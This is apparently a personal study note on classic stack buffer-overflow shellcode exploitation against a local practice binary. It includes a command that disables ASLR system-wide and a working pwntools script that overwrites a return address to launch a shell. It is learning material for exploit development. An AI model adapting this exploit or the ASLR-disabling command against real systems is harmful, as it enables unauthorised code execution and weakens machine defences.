*Running ur own code*
**Shellcode** is essentially **assembly instructions**, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions! :D
- The reason shellcode is successful is that [[Von Neumann Architecture]](the architecture used in most computers today) does not differentiate between **data** and **instructions** - it doesn't matter where or what you tell it to run, it will attempt to run it. Therefore, even though our input is data, the computer _doesn't know that_ - and we can use that to our advantage. 
## Disable ASLR:

 [[ASLR]] is a security technique that we should get rid of . * - *
 ```bash
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
## Find the Buffer in Memory :
*Reverse engineer the assembly using [[Radare2]] , use some input (AAAAA) and find where 41414141 in stack , that s likely to be the buffer :D*
## Find the padding :
*Use [[De Bruijn Sequences]] :>*

## Final exploit :
[[PwnTools]] the savior , use [[NOPs]]  for the shellcode exploit(more reliable exploit)
```python
from pwn import * 
context.binary = ELF('./vuln') #for the shellcode to be correct we need to set the context.binary 
p = process() #the process is known from the context
payload = b"\x90"*100 + asm(shellcraft.sh()) # Nop instructions + the shellcode
payload = payload.ljust(137,b'A') #adjust the payload to reach the return address using the padding found
payload += p32(0xffffcdf4)  # address of the shellcode (or nop instructions) , use p64 if u re working on 64-bit system
log.info(p.clean())
p.sendline(payload)
p.interactive() # Get the shellcode :D
```


## Summary : 
- We inject shellcode, series of assembly instructions , when prompted for input.
- We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode.
- Once the return pointer got popped into EIP (instruction pointer) , it points at our shellcode.
- This caused the program to execute our instructions, and yes we get the shellcode :DDD.
